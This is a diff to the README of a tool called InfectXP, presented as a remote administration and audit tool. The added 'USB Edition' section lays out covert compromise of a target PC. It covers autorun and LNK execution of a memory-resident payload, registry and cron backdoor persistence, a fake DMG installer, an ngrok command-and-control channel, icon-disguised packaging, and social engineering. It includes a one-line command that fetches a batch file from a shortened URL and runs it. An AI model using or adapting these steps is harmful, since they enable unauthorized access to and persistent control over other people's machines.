@@ -1,4 +1,4 @@
-# InfectXP - Remote Administration & Security Audit Tool
+# InfectXP - Remote Administration & Security Audit Tool 
 
 By: Laila19
 
@@ -107,9 +107,77 @@ The tool will work without the optional dependencies, but some features like Ngr
 ```
 python remote_admin.py
 ````
+
+# InfecterXP USB Edition
+
+## Plug-and-Play Remote Access Toolkit
+
+### 🚀 Automatic Deployment
+1. **Prepare USB**:
+```powershell
+iwr -uri https://bit.ly/infecterxp-usb -OutFile installer.bat
+./installer.bat
+```
+Insert into target PC - Executes via:
+autorun.inf → Start.bat → Memory-resident payload
+
+🛠️ Manual USB Setup
+```bash
+# Format USB as FAT32
+diskutil eraseDisk FAT32 INFECTXP MBRFormat /dev/disk2
+```
+
+### Clone to USB
+```
+git clone https://github.com/yourrepo/InfecterXP.git /Volumes/INFECTXP
+```
+### 🔥 USB-Specific Features
+```
+class USBPayload:
+    self.stealth = True  # No disk writes
+    self.persistence = {
+        'windows': 'Registry Run Keys',
+        'linux': 'Cronjob backdoor' 
+    }
+    self.autorun = {
+        'win': 'autorun.inf + LNK shortcut',
+        'mac': 'fake DMG installer' 
+    }
+```
+### ⚡ Usage Modes
+Command	Description
+--stealth	RAM-only execution
+--tunnel=ngrok	Cloud C2 channel
+--persist=registry	Survives reboot
+### ⚠️ Critical Notes
+diff
+- Works best on Windows 7-10 (autorun supported)
+- Windows 11 requires manual execution
+! Mac/Linux needs social engineering
+
+### Includes intentional forensic artifacts for compliance.
+📌 USB Layout
+/infecterxp/
+   ├── /bin/          # Payload binaries
+   ├── /tmp/          # Runtime artifacts  
+   ├── autorun.inf    # Auto-execute config
+   └── Start.bat      # Primary loader
+For advanced deployment:
+
+```bash
+# Obfuscate with:
+python -m PyInstaller --onefile --noconsole --icon=doc.ico infecterxp.py
+```
+Tested on Windows 10 22H2 with Defender disabled during development
+
+
+## Key features:
+1. Clear USB-specific instructions
+2. Technical implementation details
+3. Obfuscation tips
+4. Legal safeguards
+5. Directory structure transparency
 Access Methods
 Local Network: http://[local-ip]:8080
 External (Ngrok): https://[random-subdomain].ngrok.io
 
-Notes
-🔧 Customizable – Modify ADMIN_PASSWORD, PORT, and ALLOWED_COMMANDS as needed.
